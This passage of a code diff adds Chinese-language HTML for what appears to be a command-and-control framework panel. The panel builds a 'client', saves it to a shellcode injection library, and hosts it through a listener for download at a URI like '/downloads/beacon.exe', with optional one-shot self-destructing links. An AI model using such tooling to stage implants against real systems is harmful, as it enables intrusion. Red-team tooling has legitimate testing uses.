+                                <i class="fas fa-cogs mr-2 text-indigo-400"></i>
+                                构建控制
+                            </h3>
+                            <p id="clientBuildStatus" class="text-sm text-gray-400 mt-1">暂无构建记录，点击下方按钮开始构建。</p>
+                        </div>
+                        <div class="flex items-center space-x-3">
+                            <button id="clientBuildRefreshBtn" class="btn-secondary text-sm">
+                                <i class="fas fa-sync-alt mr-1"></i>刷新状态
+                            </button>
+                            <button id="clientBuildBtn" class="btn-primary">
+                                <span id="clientBuildSpinner" class="hidden mr-2">
+                                    <i class="fas fa-spinner fa-spin"></i>
+                                </span>
+                                <i class="fas fa-hammer mr-2"></i>生成客户端
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-gray-300">
+                        <div>
+                            <div class="flex justify-between mb-1">
+                                <span class="text-gray-400">任务 ID</span>
+                                <span id="clientBuildJobId" class="font-mono">-</span>
+                            </div>
+                            <div class="flex justify-between mb-1">
+                                <span class="text-gray-400">创建时间</span>
+                                <span id="clientBuildCreatedAt">-</span>
+                            </div>
+                            <div class="flex justify-between mb-1">
+                                <span class="text-gray-400">开始时间</span>
+                                <span id="clientBuildStartedAt">-</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-400">结束时间</span>
+                                <span id="clientBuildFinishedAt">-</span>
+                            </div>
+                        </div>
+                        <div>
+                            <div class="flex justify-between mb-1">
+                                <span class="text-gray-400">输出文件</span>
+                                <span id="clientBuildArtifact" class="font-mono">-</span>
+                            </div>
+                            <div class="mt-4 flex items-center space-x-3">
+                                <a id="clientDownloadBtn" class="inline-flex items-center px-4 py-2 rounded-lg bg-green-600 hover:bg-green-500 text-white text-sm transition-colors opacity-50 pointer-events-none">
+                                    <i class="fas fa-download mr-2"></i>
+                                    下载最新客户端
+                                </a>
+                                <button id="clientSaveToShellcodeBtn" class="inline-flex items-center px-4 py-2 rounded-lg bg-purple-600 hover:bg-purple-500 text-white text-sm transition-colors opacity-50 pointer-events-none" title="将构建产物保存到注入管理的 Shellcode 库中">
+                                    <i class="fas fa-syringe mr-2"></i>
+                                    保存到 Shellcode 库
+                                </button>
+                                <button id="clientHostToServerBtn" class="inline-flex items-center px-4 py-2 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-sm transition-colors opacity-50 pointer-events-none" title="将构建产物托管到监听器，通过HTTP对外提供下载">
+                                    <i class="fas fa-cloud-upload-alt mr-2"></i>
+                                    托管到服务器
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 右侧：构建日志 -->
+            <div>
+                <div class="chart-card h-full flex flex-col">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-lg font-semibold flex items-center">
+                            <i class="fas fa-align-left mr-2 text-gray-300"></i>
+                            构建日志
+                        </h3>
+                        <span class="text-xs text-gray-500">仅展示最近一次构建的部分日志</span>
+                    </div>
+                    <div class="flex-1 bg-gray-900/60 rounded-lg p-3 overflow-y-auto text-xs font-mono text-gray-300 border border-gray-700" id="clientBuildLog" style="max-height: 24rem;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Host to Server Modal -->
+    <div id="hostToServerModal" class="fixed inset-0 bg-black bg-opacity-60 z-50 hidden flex items-center justify-center">
+        <div class="bg-gray-800 rounded-xl border border-gray-600 w-full max-w-lg mx-4">
+            <div class="px-6 py-4 border-b border-gray-700 flex items-center justify-between">
+                <h3 class="text-lg font-semibold text-white flex items-center gap-2">
+                    <i class="fas fa-cloud-upload-alt text-blue-400"></i>
+                    托管到服务器
+                </h3>
+                <button onclick="document.getElementById('hostToServerModal').classList.add('hidden')" class="text-gray-400 hover:text-white">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="p-6 space-y-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-300 mb-1">托管 URI <span class="text-red-400">*</span></label>
+                    <input type="text" id="hostURI" placeholder="/downloads/beacon.exe" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent">
+                    <p class="text-xs text-gray-500 mt-1">文件将通过监听器的 HTTP 端口在此路径提供下载</p>
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-300 mb-1">关联监听器 <span class="text-gray-500">(可选)</span></label>
+                    <select id="hostListenerID" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent">
+                        <option value="">-- 所有监听器 --</option>
+                    </select>
+                    <p class="text-xs text-gray-500 mt-1">选择后，文件可通过该监听器的地址访问</p>
+                </div>
+                <div>
+                    <label class="flex items-center gap-2 cursor-pointer">
+                        <input type="checkbox" id="hostOneShot" class="text-blue-500 focus:ring-blue-500 rounded">
+                        <span class="text-sm text-gray-300">一次性下载（下载后自动销毁）</span>
+                    </label>
+                </div>
+                <div id="hostPreviewURL" class="hidden bg-gray-750 rounded-lg p-3 border border-gray-600">
+                    <div class="flex items-center gap-2 text-sm">
+                        <i class="fas fa-link text-green-400"></i>
+                        <span class="text-gray-300">预览下载地址:</span>
+                    </div>
+                    <p id="hostPreviewURLText" class="text-green-400 text-sm font-mono mt-1 break-all"></p>
+                </div>
+            </div>
+            <div class="px-6 py-4 border-t border-gray-700 flex justify-end gap-3">
+                <button onclick="document.getElementById('hostToServerModal').classList.add('hidden')" class="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-gray-300 rounded-lg transition-colors">
+                    取消
+                </button>
+                <button onclick="window.clientGen && window.clientGen.confirmHostToServer()" class="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors flex items-center gap-2">
+                    <i class="fas fa-cloud-upload-alt"></i>
+                    确认托管
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
